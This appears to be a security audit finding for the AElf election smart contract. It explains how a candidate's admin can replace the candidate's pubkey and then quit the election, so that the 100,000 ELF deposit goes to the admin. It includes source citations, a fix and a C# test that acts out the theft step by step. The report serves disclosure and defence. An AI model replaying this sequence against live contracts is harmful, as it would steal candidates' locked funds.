# Audit Report

## Title
Admin Can Steal Locked Election Tokens via Pubkey Replacement

## Summary
A malicious admin can steal the 100,000 ELF tokens locked during election announcement by exploiting the interaction between `AnnounceElection`, `ReplaceCandidatePubkey`, and `QuitElection`. The vulnerability allows the admin to replace a candidate's public key with one they control, then withdraw the locked tokens to their own address instead of returning them to the original candidate.

## Finding Description

The vulnerability exists in the token refund logic when a candidate quits election after their pubkey has been replaced. When a candidate announces election using `AnnounceElection`, they must designate an admin address. [1](#0-0) 

The critical issue is that `CandidateSponsorMap` is NOT set in the `AnnounceElection` flow - it only gets set in `AnnounceElectionFor`: [2](#0-1) 

The admin can then call `ReplaceCandidatePubkey` to replace the candidate's pubkey with one they control. The permission check at line 181 only verifies the caller is the admin: [3](#0-2) 

During replacement, the sponsor mapping is transferred, but since it was null for `AnnounceElection` candidates, it remains null: [4](#0-3) 

The candidate information (including the original `AnnouncementTransactionId` that serves as the lock ID) is also transferred: [5](#0-4) 

Finally, when the admin calls `QuitElection` with the new pubkey, the tokens are sent to the wrong address: [6](#0-5) 

At line 245, since `CandidateSponsorMap[input.Value]` is null, the fallback `Address.FromPublicKey(pubkeyBytes)` is used. The `pubkeyBytes` variable comes from line 231, which converts the input pubkey (the attacker's new pubkey) to bytes. Therefore, tokens are sent to the attacker's address rather than the original candidate's address.

The root cause is that `ReplaceCandidatePubkey` doesn't verify the new pubkey is controlled by or authorized by the original candidate, and `QuitElection` uses the current pubkey to derive the recipient address when no sponsor exists. The only constraint preventing this is line 191 in `ReplaceCandidatePubkey`: [7](#0-6) 

However, this only prevents using a pubkey that's already registered as a candidate. The admin can trivially generate a fresh keypair to bypass this check.

## Impact Explanation

This vulnerability enables direct theft of election deposit funds (100,000 ELF per candidate). Every candidate who uses `AnnounceElection` and designates an external admin is vulnerable. The lock amount is defined in the constants: [8](#0-7) 

The candidate has no mechanism to recover the stolen tokens once the attack is executed. This breaks the critical security invariant that locked election tokens must be returned to the rightful owner (either the candidate themselves or a designated sponsor). With potentially dozens of candidates in the system, the total exposure could exceed millions of dollars in ELF tokens, completely undermining trust in the election system.

## Likelihood Explanation

The attack requires:
1. Admin privileges - explicitly granted by candidates during announcement as a required input
2. Two straightforward transaction calls: `ReplaceCandidatePubkey` followed by `QuitElection`
3. A pubkey controlled by the admin (trivially obtained by generating a new keypair)

The attack complexity is LOW with no timing constraints, no race conditions to win, and no external dependencies. The precondition (being set as admin) is explicitly granted by candidates who trust the admin address. Candidates have no way to detect this attack before execution, and once executed, the theft is irreversible. The attack can be performed immediately after election announcement with no waiting period.

The economic incentive is extremely high: steal 100,000 ELF tokens for the cost of just 2 transaction fees (negligible). The only constraint preventing arbitrary pubkey use is already bypassable with a fresh keypair.

## Recommendation

Add validation in `QuitElection` to ensure tokens are always returned to the original candidate's address when no sponsor exists, rather than deriving the address from the current pubkey. Store the original candidate address separately from the pubkey during announcement:

```csharp
// In AnnounceElection, store the original candidate address
State.OriginalCandidateAddressMap[pubkey] = Context.Sender;

// In ReplaceCandidatePubkey, transfer the original address mapping
State.OriginalCandidateAddressMap[newPubkey] = State.OriginalCandidateAddressMap[oldPubkey];
State.OriginalCandidateAddressMap.Remove(oldPubkey);

// In QuitElection, use the original address instead of deriving from pubkey
var recipientAddress = State.CandidateSponsorMap[input.Value] ?? State.OriginalCandidateAddressMap[input.Value];
```

Alternatively, require explicit candidate authorization (signature verification) when replacing a pubkey, or prohibit pubkey replacement for candidates who announced via `AnnounceElection` (only allow it for initial miners).

## Proof of Concept

```csharp
[Fact]
public async Task AdminCanStealLockedTokensViaReplacementAttack()
{
    // Setup: Candidate announces election with malicious admin
    var candidateKeyPair = ValidationDataCenterKeyPairs[0];
    var maliciousAdmin = ValidationDataCenterKeyPairs[1]; 
    var attackerKeyPair = ValidationDataCenterKeyPairs[2]; // Fresh keypair for attacker
    
    var maliciousAdminAddress = Address.FromPublicKey(maliciousAdmin.PublicKey);
    var candidateAddress = Address.FromPublicKey(candidateKeyPair.PublicKey);
    var attackerAddress = Address.FromPublicKey(attackerKeyPair.PublicKey);
    
    // Step 1: Candidate announces election with admin
    var candidateStub = GetElectionContractTester(candidateKeyPair);
    await candidateStub.AnnounceElection.SendAsync(maliciousAdminAddress);
    
    var candidateBalanceBefore = await GetNativeTokenBalance(candidateKeyPair.PublicKey);
    var attackerBalanceBefore = await GetNativeTokenBalance(attackerKeyPair.PublicKey);
    
    // Step 2: Admin replaces candidate's pubkey with attacker's pubkey
    var adminStub = GetElectionContractTester(maliciousAdmin);
    await adminStub.ReplaceCandidatePubkey.SendAsync(new ReplaceCandidatePubkeyInput
    {
        OldPubkey = candidateKeyPair.PublicKey.ToHex(),
        NewPubkey = attackerKeyPair.PublicKey.ToHex()
    });
    
    // Step 3: Admin quits election with attacker's pubkey
    await adminStub.QuitElection.SendAsync(new StringValue
    {
        Value = attackerKeyPair.PublicKey.ToHex()
    });
    
    // Verify: Tokens went to attacker, not original candidate
    var candidateBalanceAfter = await GetNativeTokenBalance(candidateKeyPair.PublicKey);
    var attackerBalanceAfter = await GetNativeTokenBalance(attackerKeyPair.PublicKey);
    
    // Original candidate gets nothing back
    candidateBalanceAfter.ShouldBe(candidateBalanceBefore);
    
    // Attacker receives the 100,000 ELF locked tokens
    attackerBalanceAfter.ShouldBe(attackerBalanceBefore + ElectionContractConstants.LockTokenForElection);
}
```

## Notes

This vulnerability only affects candidates who use `AnnounceElection` (not `AnnounceElectionFor`). When using `AnnounceElectionFor`, the sponsor address is explicitly set and tokens are correctly returned to the sponsor. The state mapping `CandidateSponsorMap` is defined in: [9](#0-8) 

The issue demonstrates a critical oversight in the token refund logic that fails to preserve the original owner's claim to locked funds across pubkey replacements.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L93-119)
```csharp
    public override Empty AnnounceElection(Address input)
    {
        var recoveredPublicKey = Context.RecoverPublicKey();
        AnnounceElection(recoveredPublicKey);

        var pubkey = recoveredPublicKey.ToHex();
        var address = Address.FromPublicKey(recoveredPublicKey);

        Assert(input.Value.Any(), "Admin is needed while announcing election.");
        Assert(State.ManagedCandidatePubkeysMap[address] == null, "Candidate cannot be others' admin.");
        State.CandidateAdmins[pubkey] = input;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[input] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(recoveredPublicKey));
        State.ManagedCandidatePubkeysMap[input] = managedPubkeys;

        LockCandidateNativeToken();

        AddCandidateAsOption(pubkey);

        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-142)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L177-195)
```csharp
    private void LockCandidateNativeToken()
    {
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        // Lock the token from sender for deposit of announce election
        var lockId = Context.OriginTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        var sponsorAddress = Context.Sender;
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = sponsorAddress,
            To = lockVirtualAddress,
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Lock for announcing election."
        });
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L229-249)
```csharp
    public override Empty QuitElection(StringValue input)
    {
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Value);
        QuitElection(pubkeyBytes);
        var pubkey = input.Value;

        var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
        var candidateInformation = State.CandidateInformationMap[pubkey];

        // Unlock candidate's native token.
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L173-184)
```csharp
    public override Empty ReplaceCandidatePubkey(ReplaceCandidatePubkeyInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.OldPubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
            "Pubkey is in already banned.");

        // Permission check.
        Assert(Context.Sender == GetCandidateAdmin(new StringValue { Value = input.OldPubkey }), "No permission.");

        // Record the replacement.
        PerformReplacement(input.OldPubkey, input.NewPubkey);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L191-191)
```csharp
        Assert(!candidates.Value.Contains(newPubkeyBytes), "New pubkey is already a candidate.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L237-243)
```csharp
        var candidateInformation = State.CandidateInformationMap[input.OldPubkey];
        if (candidateInformation != null)
        {
            candidateInformation.Pubkey = input.NewPubkey;
            State.CandidateInformationMap[input.NewPubkey] = candidateInformation;
            State.CandidateInformationMap.Remove(input.OldPubkey);
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L320-321)
```csharp
        State.CandidateSponsorMap[newPubkey] = State.CandidateSponsorMap[oldPubkey];
        State.CandidateSponsorMap.Remove(oldPubkey);
```

**File:** contract/AElf.Contracts.Election/ElectionContractState.cs (L92-95)
```csharp
    /// <summary>
    ///     Pubkey -> Sponsor address (who will pay announce election fee for this pubkey)
    /// </summary>
    public MappedState<string, Address> CandidateSponsorMap { get; set; }
```
